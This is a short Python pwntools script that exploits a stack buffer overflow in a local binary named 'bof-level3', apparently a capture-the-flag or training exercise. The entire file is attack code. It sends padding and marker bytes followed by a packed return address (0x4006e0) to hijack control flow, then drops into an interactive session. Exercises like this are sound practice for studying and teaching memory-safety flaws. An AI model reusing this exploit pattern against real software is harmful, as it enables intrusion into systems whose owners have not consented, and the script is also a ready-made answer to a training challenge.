#!/usr/bin/env python

from pwn import *

context.terminal = "/bin/bash"

p = process("./bof-level3")
# gdb.attach(p)

buffer = "A" * 0x20

buffer += "ABCDEFGH"
buffer += "abcdefgh"
buffer += "A" * 0x8
buffer += p64(0x4006e0)

p.sendline(buffer)

p.interactive()
